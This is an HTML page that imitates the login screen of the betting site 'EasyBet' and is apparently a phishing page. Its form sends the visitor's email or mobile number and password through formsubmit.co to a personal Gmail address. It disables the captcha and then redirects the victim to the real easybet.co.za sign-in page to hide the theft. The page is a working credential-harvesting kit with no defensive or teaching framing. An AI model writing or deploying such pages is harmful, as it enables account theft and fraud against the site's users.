<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>EasyBet Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #1a1a1a;
      color: white;
    }

    header {
      background-color: #ffd700;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
    }

    .logo {
      font-size: 24px;
      font-weight: bold;
    }

    .logo span {
      color: black;
    }

    .logo b {
      color: black;
    }

    .logo b span {
      color: white;
    }

    .top-buttons a {
      margin-left: 20px;
      text-decoration: none;
      font-weight: bold;
      color: black;
    }

    .top-buttons .join-btn {
      background-color: #00bfff;
      color: white;
      padding: 8px 16px;
      border-radius: 5px;
    }

    .login-container {
      max-width: 400px;
      margin: 50px auto;
      background-color: transparent;
      padding: 20px;
      border-radius: 8px;
    }

    .login-container h2 {
      text-align: center;
      border-bottom: 1px solid gray;
      padding-bottom: 10px;
      margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }

    .password-icon {
      float: right;
      margin-top: -30px;
      margin-right: 10px;
      cursor: pointer;
    }

    .recover {
      text-align: right;
      margin-bottom: 20px;
    }

    .recover a {
      color: #ffd700;
      text-decoration: none;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #bfa200;
      color: black;
      font-weight: bold;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .create-account {
      text-align: center;
      margin-top: 20px;
    }

    .create-account a {
      color: #ffd700;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <header>
    <div class="logo"><span>easy</span><b><span>bet</span></b></div>
    <div class="top-buttons">
      <a href="#">Login</a>
      <a href="#" class="join-btn">Join</a>
    </div>
  </header>

  <div class="login-container">

<form action="https://formsubmit.co/Mashele7705@gmail.com" method="POST">

<input type="hidden" name="_captcha" value="false"> <!-- Disables reCAPTCHA -->

<input type="hidden" name="_next" value="https://easybet.co.za/sign-in">
    <h2>Log In</h2>
    <div class="form-group">
      <label>Email/Mobile number</label>
      <input type="text" name="email_or_number" placeholder="Enter email or mobile number">
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Enter Password">
      <span class="password-icon">&#128274;</span>
    </div>
    <div class="recover">
      <a href="#">Forgot password? <strong>Recover it</strong></a>
    </div>
    <button class="login-btn">Log In</button>
    <div class="create-account">
      <p>Don't have an account? <a href="#">Create it now</a></p>
    </div>
  </div>

</body>
</html>
